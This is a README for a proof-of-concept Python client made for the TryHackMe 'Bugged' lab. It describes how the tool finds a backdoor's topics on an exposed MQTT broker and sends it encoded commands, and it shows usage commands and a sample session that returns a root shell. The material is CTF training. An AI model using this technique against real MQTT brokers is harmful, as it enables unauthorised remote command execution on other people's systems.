# MQTT Backdoor Shell — THM: Bugged (PoC)

MQTT-based backdoor shell client for the TryHackMe room [Bugged](https://tryhackme.com/room/bugged). Connects to an exposed MQTT broker, discovers the backdoor's command/response topics via wildcard subscription, and opens an interactive shell.

---

## How it works

1. Connects to the MQTT broker and subscribes to `#` (all topics).
2. Waits for a registration message from the backdoor containing `pub_topic` and `sub_topic`.
3. Subscribes to the response topic and opens an interactive shell.
4. Each command is base64-encoded as JSON and published to the backdoor's input topic.
5. The response is received on the output topic, decoded, and printed.

## Requirements

- Python 3
- Install dependencies:

```bash
python3 -m venv venv
source venv/bin/activate
python3 -m pip install paho-mqtt prompt_toolkit
```

## Usage

```bash
python3 mqtt_shell.py <BROKER_IP> [--port 1883]
```

**Example:**

```
$ python3 mqtt_shell.py 10.10.10.10
[*] Connecting to 10.10.10.10:1883...
[*] Waiting for backdoor registration...
[+] sub_topic: commands/input
[+] pub_topic: commands/output
[+] Shell opened. Type 'exit' or Ctrl+C to quit.

Shell> id
uid=0(root) gid=0(root) groups=0(root)
```

## References

- [TryHackMe — Bugged](https://tryhackme.com/room/bugged)
- [paho-mqtt documentation](https://eclipse.dev/paho/files/paho.mqtt.python/html/index.html)

## Credits

- **Cleanup & interactive shell:** [Esteban Zárate](https://github.com/estebanzarate)
